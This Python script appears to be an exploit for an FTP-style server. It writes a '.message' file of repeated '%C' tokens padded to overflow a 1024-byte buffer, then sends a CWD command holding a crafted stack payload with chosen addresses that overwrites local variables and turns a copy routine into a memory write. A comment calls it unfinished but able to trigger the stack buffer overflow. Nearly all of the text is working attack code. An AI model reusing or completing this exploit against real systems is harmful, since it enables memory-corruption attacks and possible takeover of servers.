#!/usr/bin/env python3

import sys
from struct import pack, unpack

out=None
bufsize=1024

# -1360 buf
# -336 rarr
# -204 marr
# -72 args
# -68 m
# -64 r
# -60 rlen
# -56 tmp
# -52 count
# -48 dyn
# -44 blen
# -40 mlen
# -36 pbuf
# -32 rptr
# -28 mptr
# -24 cp
# -20 src

def stackpayload(rarr, marr, rlen, blen, mlen, pbuf, rptr, mptr, cp, src):
    stack = b''

    for p in rarr:
        stack += pack('<I', p)
    for p in range(33-len(rarr)):
        stack += b'rar' + pack('B', p+0x41)

    for p in marr:
        stack += pack('<I', p)
    for p in range(33-len(marr)):
        stack += b'mar' + pack('B', p+0x41)

    stack += b'args' #args
    stack += b'mmmm' #m
    stack += b'rrrr' #r
    stack += pack('<I', rlen)

    stack += b'tmpX' #tmp
    stack += b'coun' #count
    stack += b'dynX' #dyn

#    stack += pack('<I', 0x99999999)
#    stack += pack('<I', 0xaaaaaaaa)
#    stack += pack('<I', 0xbbbbbbbb)
#    stack += pack('<I', 0xcccccccc)
#    stack += pack('<I', 0xdddddddd)
#    stack += pack('<I', 0xeeeeeeee)
#    stack += pack('<I', 0xefffffff)
    stack += pack('<I', blen)
    stack += pack('<I', mlen)
    stack += pack('<I', pbuf)
    stack += pack('<I', rptr)
    stack += pack('<I', mptr)
    stack += pack('<I', cp)
    stack += pack('<I', src)


    return stack

def message(dirnamelen):
    x = (bufsize-1)//dirnamelen
    y = bufsize-dirnamelen*x-1
    sys.stderr.write("%%C %d times\n" % x)
    sys.stderr.write("len of dirname: %d\n" % dirnamelen)
    sys.stderr.write("X %d times\n" % y)
    sys.stderr.write("so total %d bytes\n" % (x*dirnamelen+y))
    filedata = b''
    filedata += b'%C'*x
    filedata += b'X'*y
    filedata += b'A'
    filedata += b'%C'
    return filedata

#NOTE: this code is not finished, but can be used to trigger the stack buffer overflow
def copy(src, dest, n):
    NE_HIGH=0x01ff0101
    irrelevant = 0xffffffff
    rodatasect = 0x10026ae8
    datasect = 0x10029010
    rlen = 0xf10121f1
    cp = (dest-rlen)%0xffffffff
    mlen = (NE_HIGH-src)%0xffffffff
    sys.stderr.write("cp=%x\n" % cp)
    sys.stderr.write("mlen=%x\n" % mlen)
    #mptr is set to 41414141 to highlight the access fault during execution
    pl = stackpayload(rarr=[datasect, src], marr=[0xffffffff, 0xffffffff], rlen=rlen, blen=irrelevant, mlen=mlen, pbuf=NE_HIGH, rptr=irrelevant, mptr=0x41414141, cp=cp, src=NE_HIGH)
    ftpput(message(len(pl)))
    ftp(b'CWD '+pl)

def ftpput(data, filename='.message'):
    ftp(b'PUT ' + bytes(filename, 'ascii'))
    out.write(data)
    out.write(b'\0')

def ftp(cmd):
    out.write(cmd)
    out.write(b'\n')

if __name__ == '__main__':
    out = sys.stdout.buffer
    if len(sys.argv) > 1:
        for i in sys.argv[1:]:
            ftpput(bytes(i,'ascii'))
            ftp(b'CWD aa')
        exit(0)

    copy(0x10026c54, 0x10026c48, 4)
    ftpput(b'%T')
    ftp(b'PWD')
